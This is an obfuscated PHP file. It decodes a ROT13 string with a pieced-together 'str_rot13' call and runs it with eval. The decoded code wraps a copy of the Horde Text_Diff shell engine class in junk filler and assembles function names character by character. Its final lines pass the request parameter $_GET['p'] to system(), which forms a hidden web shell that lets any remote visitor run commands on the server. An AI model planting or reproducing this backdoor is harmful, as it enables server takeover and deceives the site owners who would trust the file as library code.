<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_71024 = \"n\".\"f\".\"f\".\"r\".\"e\".\"g\";
__sa_94023 = \"f\".\"u\".\"r\".\"y\".\"y\".\"_\".\"r\".\"k\".\"r\".\"p\";
<?cuc
/**
 * Pynff hfrq vagreanyyl ol Qvss gb npghnyyl pbzchgr gur qvssf.
 *
 * Guvf pynff hfrf gur Havk `qvss` cebtenz ivn furyy_rkrp gb pbzchgr gur
 * qvssreraprf orgjrra gur gjb vachg neenlf.
 *
 * Pbclevtug 2007-2010 Gur Ubeqr Cebwrpg (uggc://jjj.ubeqr.bet/)
 *
 * Frr gur rapybfrq svyr PBCLVAT sbe yvprafr vasbezngvba (YTCY). Vs lbh qvq
 * abg erprvir guvf svyr, frr uggcf://bcrafbhepr.bet/yvprafr/ytcy-2-1/.
 *
 * @nhgube  Zvyvna Jbyss <znvy@zvyvnaj.qr>
 * @cnpxntr Grkg_Qvss
 * @fvapr   0.3.0
 */
pynff Grkg_Qvss_Ratvar_furyy {

    /**
     * Cngu gb gur qvss rkrphgnoyr
     *
     * @ine fgevat
     */
    ine $_qvssPbzznaq = 'qvss';

    /**
     * Ergheaf gur neenl bs qvssreraprf.
     *
     * @cnenz neenl $sebz_yvarf yvarf bs grkg sebz byq svyr
     * @cnenz neenl $gb_yvarf   yvarf bs grkg sebz arj svyr
     *
     * @erghea neenl nyy punatrf znqr (neenl jvgu Grkg_Qvss_Bc_* bowrpgf)
     */
    shapgvba qvss($sebz_yvarf, $gb_yvarf)
    {
        neenl_jnyx($sebz_yvarf, neenl('Grkg_Qvss', 'gevzArjyvarf'));
        neenl_jnyx($gb_yvarf, neenl('Grkg_Qvss', 'gevzArjyvarf'));

        $grzc_qve = Grkg_Qvss::_trgGrzcQve();

        // Rkrphgr tah qvss be fvzvyne gb trg n fgnaqneq qvss svyr.
        $sebz_svyr = grzcanz($grzc_qve, 'Grkg_Qvss');
        $gb_svyr = grzcanz($grzc_qve, 'Grkg_Qvss');
        $sc = sbcra($sebz_svyr, 'j');
        sjevgr($sc, vzcybqr(\"\a\", $sebz_yvarf));
        spybfr($sc);
        $sc = sbcra($gb_svyr, 'j');
        sjevgr($sc, vzcybqr(\"\a\", $gb_yvarf));
        spybfr($sc);
        $qvss = __sa_94023($guvf->_qvssPbzznaq . ' ' . $sebz_svyr . ' ' . $gb_svyr);
        hayvax($sebz_svyr);
        hayvax($gb_svyr);

        vs (vf_ahyy($qvss)) {
            // Ab punatrf jrer znqr
            erghea neenl(arj Grkg_Qvss_Bc_pbcl($sebz_yvarf));
        }

        $sebz_yvar_ab = 1;
        $gb_yvar_ab = 1;
        $rqvgf = neenl();

        // Trg punatrq yvarf ol cnefvat fbzrguvat yvxr:
        // 0n1,2
        // 1,2p4,6
        // 1,5q6
        cert_zngpu_nyy('#^(\q+)(?:,(\q+))?([nqp])(\q+)(?:,(\q+))?$#z', $qvss,
            $zngpurf, CERT_FRG_BEQRE);

        sbernpu ($zngpurf nf $zngpu) {
            vs (!vffrg($zngpu[5])) {
                // Guvf cnera vf abg frg rirel gvzr (frr ertrk).
                $zngpu[5] = snyfr;
            }

            vs ($zngpu[3] == 'n') {
                $sebz_yvar_ab--;
            }

            vs ($zngpu[3] == 'q') {
                $gb_yvar_ab--;
            }

            vs ($sebz_yvar_ab < $zngpu[1] || $gb_yvar_ab < $zngpu[4]) {
                // pbcvrq yvarf
                __sa_71024($zngpu[1] - $sebz_yvar_ab == $zngpu[4] - $gb_yvar_ab);
                neenl_chfu($rqvgf,
                    arj Grkg_Qvss_Bc_pbcl(
                        $guvf->_trgYvarf($sebz_yvarf, $sebz_yvar_ab, $zngpu[1] - 1),
                        $guvf->_trgYvarf($gb_yvarf, $gb_yvar_ab, $zngpu[4] - 1)));
            }

            fjvgpu ($zngpu[3]) {
            pnfr 'q':
                // qryrgrq yvarf
                neenl_chfu($rqvgf,
                    arj Grkg_Qvss_Bc_qryrgr(
                        $guvf->_trgYvarf($sebz_yvarf, $sebz_yvar_ab, $zngpu[2])));
                $gb_yvar_ab++;
                oernx;

            pnfr 'p':
                // punatrq yvarf
                neenl_chfu($rqvgf,
                    arj Grkg_Qvss_Bc_punatr(
                        $guvf->_trgYvarf($sebz_yvarf, $sebz_yvar_ab, $zngpu[2]),
                        $guvf->_trgYvarf($gb_yvarf, $gb_yvar_ab, $zngpu[5])));
                oernx;

            pnfr 'n':
                // nqqrq yvarf
                neenl_chfu($rqvgf,
                    arj Grkg_Qvss_Bc_nqq(
                        $guvf->_trgYvarf($gb_yvarf, $gb_yvar_ab, $zngpu[5])));
                $sebz_yvar_ab++;
                oernx;
            }
        }

        vs (!rzcgl($sebz_yvarf)) {
            // Fbzr yvarf zvtug fgvyy or craqvat. Nqq gurz nf pbcvrq
            neenl_chfu($rqvgf,
                arj Grkg_Qvss_Bc_pbcl(
                    $guvf->_trgYvarf($sebz_yvarf, $sebz_yvar_ab,
                                     $sebz_yvar_ab + pbhag($sebz_yvarf) - 1),
                    $guvf->_trgYvarf($gb_yvarf, $gb_yvar_ab,
                                     $gb_yvar_ab + pbhag($gb_yvarf) - 1)));
        }

        erghea $rqvgf;
    }

    /**
     * Trg yvarf sebz rvgure gur byq be arj grkg
     *
     * @npprff cevingr
     *
     * @cnenz neenl $grkg_yvarf Rvgure $sebz_yvarf be $gb_yvarf (cnffrq ol ersrerapr).
     * @cnenz vag   $yvar_ab    Pheerag yvar ahzore (cnffrq ol ersrerapr).
     * @cnenz vag   $raq        Bcgvbany raq yvar, jura jr jnag gb pubc zber
     *                          guna bar yvar.
     *
     * @erghea neenl Gur pubccrq yvarf
     */
    shapgvba _trgYvarf(&$grkg_yvarf, &$yvar_ab, $raq = snyfr)
    {
        vs (!rzcgl($raq)) {
            $yvarf = neenl();
            // Jr pna fuvsg rira zber
            juvyr ($yvar_ab <= $raq) {
                neenl_chfu($yvarf, neenl_fuvsg($grkg_yvarf));
                $yvar_ab++;
            }
        } ryfr {
            $yvarf = neenl(neenl_fuvsg($grkg_yvarf));
            $yvar_ab++;
        }

        erghea $yvarf;
    }

}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>